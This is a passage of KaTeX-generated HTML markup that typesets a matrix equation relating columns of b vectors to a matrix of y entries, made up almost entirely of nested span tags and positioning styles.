class=\"delimsizinginner delim-size4\"><span>⎛</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.150079999999999em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-c\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.77em;\"><span style=\"top:-8.6175em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-7.4174999999999995em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-5.5575em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord\">⋮</span><span class=\"mord rule\" style=\"border-right-width:0em;border-top-width:1.5em;bottom:0em;\"></span></span></span></span><span style=\"top:-3.6975000000000002em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord\">⋮</span><span class=\"mord rule\" style=\"border-right-width:0em;border-top-width:1.5em;bottom:0em;\"></span></span></span></span><span style=\"top:-1.8375000000000001em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord\">⋮</span><span class=\"mord rule\" style=\"border-right-width:0em;border-top-width:1.5em;bottom:0em;\"></span></span></span></span><span style=\"top:0.022500000000000242em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord\">⋮</span><span class=\"mord rule\" style=\"border-right-width:0em;border-top-width:1.5em;bottom:0em;\"></span></span></span></span><span style=\"top:1.2224999999999995em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.27em;\"><span></span></span></span></span></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"col-align-c\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.77em;\"><span style=\"top:-8.6175em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-7.4174999999999995em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-5.5575em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord\">⋮</span><span class=\"mord rule\" style=\"border-right-width:0em;border-top-width:1.5em;bottom:0em;\"></span></span></span></span><span style=\"top:-3.6975000000000002em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord\">⋮</span><span class=\"mord rule\" style=\"border-right-width:0em;border-top-width:1.5em;bottom:0em;\"></span></span></span></span><span style=\"top:-1.8375000000000001em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord\">⋮</span><span class=\"mord rule\" style=\"border-right-width:0em;border-top-width:1.5em;bottom:0em;\"></span></span></span></span><span style=\"top:0.022500000000000242em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord\">⋮</span><span class=\"mord rule\" style=\"border-right-width:0em;border-top-width:1.5em;bottom:0em;\"></span></span></span></span><span style=\"top:1.2224999999999995em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.27em;\"><span></span></span></span></span></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"col-align-c\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.77em;\"><span style=\"top:-8.43em;\"><span class=\"pstrut\" style=\"height:3.5em;\"></span><span class=\"mord\"><span class=\"minner\">⋯</span></span></span><span style=\"top:-7.2299999999999995em;\"><span class=\"pstrut\" style=\"height:3.5em;\"></span><span class=\"mord\"><span class=\"minner\">⋯</span></span></span><span style=\"top:-5.37em;\"><span class=\"pstrut\" style=\"height:3.5em;\"></span><span class=\"mord\"></span></span><span style=\"top:-3.5100000000000002em;\"><span class=\"pstrut\" style=\"height:3.5em;\"></span><span class=\"mord\"></span></span><span style=\"top:-1.6500000000000001em;\"><span class=\"pstrut\" style=\"height:3.5em;\"></span><span class=\"mord\"></span></span><span style=\"top:0.21000000000000024em;\"><span class=\"pstrut\" style=\"height:3.5em;\"></span><span class=\"mord\"></span></span><span style=\"top:1.4099999999999995em;\"><span class=\"pstrut\" style=\"height:3.5em;\"></span><span class=\"mord\"><span class=\"minner\">⋯</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.27em;\"><span></span></span></span></span></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"col-align-c\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.77em;\"><span style=\"top:-8.6175em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">m</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-7.4174999999999995em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">m</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-5.5575em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord\">⋮</span><span class=\"mord rule\" style=\"border-right-width:0em;border-top-width:1.5em;bottom:0em;\"></span></span></span></span><span style=\"top:-3.6975000000000002em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord\">⋮</span><span class=\"mord rule\" style=\"border-right-width:0em;border-top-width:1.5em;bottom:0em;\"></span></span></span></span><span style=\"top:-1.8375000000000001em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord\">⋮</span><span class=\"mord rule\" style=\"border-right-width:0em;border-top-width:1.5em;bottom:0em;\"></span></span></span></span><span style=\"top:0.022500000000000242em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord\">⋮</span><span class=\"mord rule\" style=\"border-right-width:0em;border-top-width:1.5em;bottom:0em;\"></span></span></span></span><span style=\"top:1.2224999999999995em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">m</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.27em;\"><span></span></span></span></span></span></span></span><span class=\"mclose\"><span class=\"delimsizing mult\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.650080000000003em;\"><span style=\"top:1.3500599999999987em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎠</span></span></span><span style=\"top:0.20004999999999878em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-0.3949600000000015em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-0.9899700000000017em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-1.5849800000000018em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-2.179990000000002em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-2.7750000000000017em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-3.3700100000000015em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-3.9650200000000013em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-4.560030000000001em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-5.155040000000001em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-5.750050000000002em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-6.345060000000002em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-6.410060000000002em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-7.650080000000003em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎞</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.150079999999999em;\"><span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:11.579999999999998em;vertical-align:-5.539999999999999em;\"></span><span class=\"minner\"><span class=\"mopen\"><span class=\"delimsizing mult\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.950085000000001em;\"><span style=\"top:1.6500649999999992em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎝</span></span></span><span style=\"top:0.5000549999999994em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-0.09495500000000094em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-0.6899650000000012em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-1.2849750000000013em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-1.8799850000000013em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-2.474995000000001em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-3.0700050000000014em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-3.6650150000000012em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-4.260025000000001em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-4.855035000000001em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-5.450045000000001em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-6.0450550000000005em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-6.640065000000001em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-6.710065000000001em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-7.950085000000001em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎛</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.450085em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-c\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:6.039999999999999em;\"><span style=\"top:-8.8875em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-7.687499999999999em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-5.8275em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord\">⋮</span><span class=\"mord rule\" style=\"border-right-width:0em;border-top-width:1.5em;bottom:0em;\"></span></span></span></span><span style=\"top:-4.6275em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">m</span><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-2.7674999999999996em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord\">⋮</span><span class=\"mord rule\" style=\"border-right-width:0em;border-top-width:1.5em;bottom:0em;\"></span></span></span></span><span style=\"top:-1.5674999999999997em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.34480000000000005em;\"><span style=\"top:-2.5198em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mopen mtight\">(</span><span class=\"mord mtight\">2</span><span class=\"mord mathnormal mtight\">m</span><span class=\"mclose mtight\">)</span><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3551999999999999em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:0.2924999999999998em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord\">⋮</span><span class=\"mord rule\" style=\"border-right-width:0em;border-top-width:1.5em;bottom:0em;\"></span></span></span></span><span style=\"top:1.492499999999999em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">n</span><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.539999999999999em;\"><span></span></span></span></span></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"col-align-c\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:6.039999999999999em;\"><span style=\"top:-8.8875em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-7.687499999999999em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-5.8275em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord\">⋮</span><span class=\"mord rule\" style=\"border-right-width:0em;border-top-width:1.5em;bottom:0em;\"></span></span></span></span><span style=\"top:-4.6275em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">m</span><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-2.7674999999999996em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord\">⋮</span><span class=\"mord rule\" style=\"border-right-width:0em;border-top-width:1.5em;bottom:0em;\"></span></span></span></span><span style=\"top:-1.5674999999999997em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.34480000000000005em;\"><span style=\"top:-2.5198em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mopen mtight\">(</span><span class=\"mord mtight\">2</span><span class=\"mord mathnormal mtight\">m</span><span class=\"mclose mtight\">)</span><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3551999999999999em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:0.2924999999999998em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord\">⋮</span><span class=\"mord rule\" style=\"border-right-width:0em;border-top-width:1.5em;bottom:0em;\"></span></span></span></span><span style=\"top:1.492499999999999em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">n</span><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.539999999999999em;\"><span></span></span></span></span></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"col-align-c\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:6.039999999999999em;\"><span style=\"top:-8.7em;\"><span class=\"pstrut\" style=\"height:3.5em;\"></span><span class=\"mord\"><span class=\"minner\">⋯</span></span></span><span style=\"top:-7.499999999999999em;\"><span class=\"pstrut\" style=\"height:3.5em;\"></span><span class=\"mord\"><span class=\"minner\">⋯</span></span></span><span style=\"top:-5.64em;\"><span class=\"pstrut\" style=\"height:3.5em;\"></span><span class=\"mord\"></span></span><span style=\"top:-4.44em;\"><span class=\"pstrut\" style=\"height:3.5em;\"></span><span class=\"mord\"><span class=\"minner\">⋯</span></span></span><span style=\"top:-2.5799999999999996em;\"><span class=\"pstrut\" style=\"height:3.5em;\"></span><span class=\"mord\"></span></span><span 